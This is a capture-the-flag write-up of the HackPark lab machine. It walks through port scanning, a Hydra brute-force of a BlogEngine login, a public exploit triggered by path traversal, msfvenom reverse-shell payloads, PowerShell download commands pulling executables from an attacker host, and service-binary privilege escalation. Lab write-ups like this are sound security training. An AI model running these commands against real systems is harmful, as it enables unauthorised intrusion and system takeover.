# HackPark machine
#### Silver Garc√≠a

## NMAP
```
sudo nmap -sV -Pn 10.10.194.184
```
```
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
3389/tcp open  ssl/ms-wbt-server?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Hydra
Take a look at the request bein made in BurpSuite to create the command for hydra
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.146.120 -v http-post-form "/Account/login.aspx:__VIEWSTATE=KdX9ImHSAq2xyjpZCx%2B1ZnGkaKsKKyAPYceJQxdT6M%2FBz%2BNKWBS74mjXZVZXuqGVuPIcdhkmHv8UemF6GAUpuuTMcndhFxh3AhzWQ8YRMh%2Fyho3u81CvBzUBYtrwo5WZhc8qSB%2FuzQKwfQF42wgLS2KjmkipVkCsaM7ouo%2FhWfy8hZOz&__EVENTVALIDATION=wYc5Dhlm3N7bV16V0WOtac%2FLAs2RdhkLphhQpzwohyHngTW5RvhDAh1vmmF5MJSAoEtanIZOHD5XSw14AFQww6TOagJIbhukw8g8xdZtLyINTiqFerF2vjABj5Eeu5u1UURR9D1pPSOOnMIDmojGeH7VanRv67juos8MAGxAKI0tUbKX&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -t 4
```

**[80][http-post-form] host: 10.10.146.120   login: admin   password: 1qaz2wsx**

## Compromise the machine
The version of blogengine is in the 'about' section of the dashboard

### Finding a public exploit
https://www.exploit-db.com/exploits/46353

### Using exploit

1. Change IP address and port to the attack victim
2. Upload the exploit editing one blog
3. Set the listener on the attacker machine
4 To execute the payload, go to the URL http://10.10.146.120/?theme=../../App_Data/files

## Privilege escalation with metasploit
Create payload with msfvenom
```
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.8.145.104 LPORT=5555 -f exe -o mamberroi.exe
```
To move the file to the target machine:
1. Set up python http server
2. Download file from target machine
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.145.104:8000/mamberroi.exe','mamberroi.exe')"
```

3. Load module on metasploit
module: multi/handler
payload: windows/meterpreter_reverse_tcp

4. Execute payload on target
mamberroi.exe

Now we have the meteprter lets see the services running
1. load powershell
2. powershell_shell
3. Print running services
```
Get-Service | Where-Object {$_.Status -eq "Running"}
```
**WindowsScheduler can be used to escalate privileges**

Looking at the folder of the service, the log files, found out that the 'message.exe' file is the binary that will be used to escalate privileges

Creating a different file por the reverse shell
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.145.104 LPORT=4444 -f exe-service -o shell.exe
```

Downloading file from python3 http server
```
powershell -c "Invoke-webrequest 'http://10.8.145.104:8000/shell.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\shell.exe'"
```